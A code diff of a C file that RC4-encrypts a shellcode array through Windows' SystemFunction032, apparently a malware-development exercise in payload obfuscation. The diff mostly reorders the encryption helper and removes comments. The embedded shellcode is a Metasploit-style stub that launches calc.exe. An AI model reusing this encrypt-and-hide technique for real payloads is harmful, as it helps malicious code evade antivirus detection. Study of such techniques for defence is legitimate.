@@ -2,52 +2,6 @@
 #include <stdio.h>
 
 
-
-// Defining a USTRING struct (tagged) for compatibility across compilers
-// This is what SystemFunction032 function take as parameters
-typedef struct _USTRING
-{
-	DWORD	Length;
-	DWORD	MaximumLength;
-	PVOID	Buffer;
-
-} USTRING, *PUSTRING;
-
-
-// Defining how does the SystemFunction032 function look. 
-typedef NTSTATUS(NTAPI* fnSystemFunction032)(
-	PUSTRING Data,
-	PUSTRING Key
-	);
-
-
-BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {
-
-	// The return of SystemFunction032
-	NTSTATUS	STATUS = 0;
-
-	// Making 2 USTRING variables
-	// 1 is passed as the key and the other one is passed as the block of data to encrypt/decrypt
-	USTRING		Key = { .Buffer = pRc4Key, 		.Length = dwRc4KeySize,		.MaximumLength = dwRc4KeySize },
-		Data = { .Buffer = pPayloadData, 	.Length = sPayloadSize,		.MaximumLength = sPayloadSize };
-
-
-	// Since SystemFunction032 is exported from Advapi32.dll, use LoadLibraryA to load Advapi32.dll into the process, 
-	// And use LoadLibraryA's return value as the hModule parameter in GetProcAddress
-	fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA("advapi32.dll"), "SystemFunction032");
-
-	// If the SystemFunction032 invocation failed, it will return a non-zero value 
-	if ((STATUS = SystemFunction032(&Data, &Key)) != 0x0) {
-		printf("[!] SystemFunction032 FAILED With Error: 0x%0.8X \n", STATUS);
-		return FALSE;
-	}
-
-	return TRUE;
-}
-
-/*unsigned char shellcode[] = {
-	"This is very spooky stuff, doing rc4 encryption !"
-};*/
 unsigned char shellcode[276] = {
 	0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,
 	0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,
@@ -74,6 +28,41 @@ unsigned char shellcode[276] = {
 	0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,
 	0x00
 };
+
+typedef struct _USTRING
+{
+	DWORD	Length;
+	DWORD	MaximumLength;
+	PVOID	Buffer;
+
+} USTRING, *PUSTRING;
+
+
+typedef NTSTATUS(NTAPI* fnSystemFunction032)(
+	PUSTRING Data,
+	PUSTRING Key
+	);
+
+
+BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {
+
+	NTSTATUS	STATUS = 0;
+
+	USTRING		Key = { .Buffer = pRc4Key, 		.Length = dwRc4KeySize,		.MaximumLength = dwRc4KeySize },
+		Data = { .Buffer = pPayloadData, 	.Length = sPayloadSize,		.MaximumLength = sPayloadSize };
+
+
+	fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA("advapi32.dll"), "SystemFunction032");
+
+	if ((STATUS = SystemFunction032(&Data, &Key)) != 0x0) {
+		printf("[!] SystemFunction032 FAILED With Error: 0x%0.8X \n", STATUS);
+		return FALSE;
+	}
+
+	return TRUE;
+}
+
+
 
 unsigned char key[] = {
 	0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F
@@ -119,8 +108,3 @@ int main() {
 	return 0;
 
 }
-
-/*for (size_t i = 0; i < sizeof(shellcode); i++) {
-	printf("%02x ", (unsigned char)shellcode[i]);
-}
-printf("\n");*/
